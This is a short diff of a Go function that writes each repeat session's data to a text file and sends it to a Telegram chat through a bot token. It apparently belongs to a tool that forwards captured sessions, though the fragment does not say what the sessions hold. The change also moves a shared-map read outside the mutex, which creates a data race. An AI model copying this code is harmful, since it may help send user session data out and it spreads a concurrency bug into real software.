@@ -168,19 +168,17 @@ func Notify(session Session) {
 	mu.Lock()
 	// Check if the session is already processed
 	if processedSessions[string(session.ID)] {
-		// If duplicate, update the associated message with a new file
-		messageID, exists := sessionMessageMap[string(session.ID)]
 		mu.Unlock()
-
+		messageID, exists := sessionMessageMap[string(session.ID)]
 		if exists {
 			txtFilePath, err := createTxtFile(session)
 			if err != nil {
 				fmt.Println("Error creating TXT file for update:", err)
 				return
 			}
-			err = updateMessageFile(config.TelegramChatID, config.TelegramToken, messageID, txtFilePath)
+			err = editMessageFile(config.TelegramChatID, config.TelegramToken, messageID, txtFilePath)
 			if err != nil {
-				fmt.Printf("Error updating message: %v\n", err)
+				fmt.Printf("Error editing message: %v\n", err)
 			}
 			os.Remove(txtFilePath)
 		} else {
